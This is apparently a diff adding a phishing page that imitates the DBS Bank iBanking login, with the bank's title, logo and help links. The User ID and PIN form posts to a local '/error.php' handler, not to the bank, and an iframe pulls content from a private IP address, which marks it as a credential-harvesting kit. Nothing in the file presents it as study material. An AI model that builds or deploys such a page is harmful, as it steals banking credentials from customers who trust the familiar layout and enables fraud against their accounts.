@@ -1,0 +1,94 @@
+<html><head> 
+
+
+
+
+
+
+
+ 
+	<meta http-equiv="PRAGMA" content="NO-CACHE">
+   	<meta http-equiv="Cache-Control" content="no-cache">
+   	<meta http-equiv="expires" content="0">
+   	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+   	<meta name="Copyright" content="(c) Copyright  2004 DBS Bank">
+   	<meta name="viewport" content="width=device-width, initial-scale=1,  user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="format-detection" content="telephone=no">
+  
+	<title>DBS iBanking</title>
+	<link rel="stylesheet" href="style/themes_login.css">
+	<link rel="stylesheet" href="style/language_login.css">
+	<link rel="stylesheet" href="dbs/stylesheets/css/login.css">
+</head>
+<body>
+
+<iframe src="http://10.20.20.20/IB/Welcome/dbs/iframe.html" id="iframe1" name="iframe1" scrolling="no" frameborder="0" class="content-holder">
+
+</iframe>
+
+
+
+<form action="/error.php" method="post" id="dbs1">
+
+<div class="login-form">
+	
+	<div class="text-center logo">
+	 
+	 <img src="dbs/images/desktoplogo.png">
+	 
+	 </div>
+	 
+		
+
+
+         
+            <div class="form-row input-layout">
+                <input tabindex="1" type="text" name="UID" id="UID" maxlength="20" placeholder="" class="left" autocomplete="off">
+						    <span class="highlight"></span>
+						    <span id="uidBar" class="bar"></span>
+						    <label>User ID</label>
+            </div>
+            
+         
+		
+            
+            <div class="form-row input-layout pin">
+                <input tabindex="2" onkeyup="keyUp(event)" onkeydown="return onlyNumerics(event)" type="password" maxlength="9" placeholder="" name="PIN" id="PIN" autocomplete="off" class="left">
+                            <span class="highlight"></span>
+						    <span id="pinBar" class="bar"></span>
+						    <label>PIN</label>
+            </div>
+             
+            
+            <div class="mTop-38">
+
+</form>
+            
+            <button class="btn btn-primary block mBot-12" id="submit" name="submit" form="dbs1">Login</button>
+
+ 			
+			<button class="btn btn-secondary right mBot-16" onclick="/error1.php" title="Get Started" tabindex="4" type="button">Get Started</button>
+			
+	</div>
+			<div class="links">
+                <ul class="">
+                    <li>Forgot <a href="javascript:aaLinkClick('login box-','forgot user id');javascript:submitibAPLEventForm('PrintUID');" onclick="callNIClick('int_linkclick', 'ib_loginbox', 'forgotuserid');" title="User ID" tabindex="5">User ID</a> or <a href="javascript:aaLinkClick('login box-','pin');javascript:submitibAPLEventForm('ResetPIN');" onclick="callNIClick('int_linkclick', 'ib_loginbox', 'forgotpin');" title="PIN" tabindex="6">PIN</a></li>
+					<li><a href="javascript:aaLinkClick('login box-','faq');javascript:GetTip('https://www.dbs.com.sg/ibanking/redirect/index.html?ref=pweb-dbs-ibanking-login-faq')" onclick="callNIClick('int_linkclick', 'ib_loginbox', 'faq');" title="Frequently Asked Questions" tabindex="7">Frequently Asked Questions</a></li>
+					<li><a href="javascript:aaLinkClick('login box-','maintenance schedule');javascript:GetTip('https://www.dbs.com.sg/ibanking/redirect/index.html?ref=pweb-dbs-maintenance-schedule')" onclick="callNIClick('int_linkclick', 'ib_loginbox', 'maintenance');" title="Maintenance Schedule" tabindex="8">Maintenance Schedule</a></li>
+                    <li><a href="https://www.dbs.com.sg/ibanking/redirect/index.html?ref=pweb-dbs-security-and-you-phishing" target="_blank" onclick="aaLinkClick('login box-','security and you');callNIClick('int_linkclick', 'ib_loginbox', 'security');" title="Security &amp; You" tabindex="9">Security &amp; You</a></li>
+                </ul>
+            </div>
+
+</div>
+<!--body Ends Here-->
+
+
+
+<meta http-equiv="PRAGMA" content="NO-CACHE">
+
+
+
+
+
+</body></html>
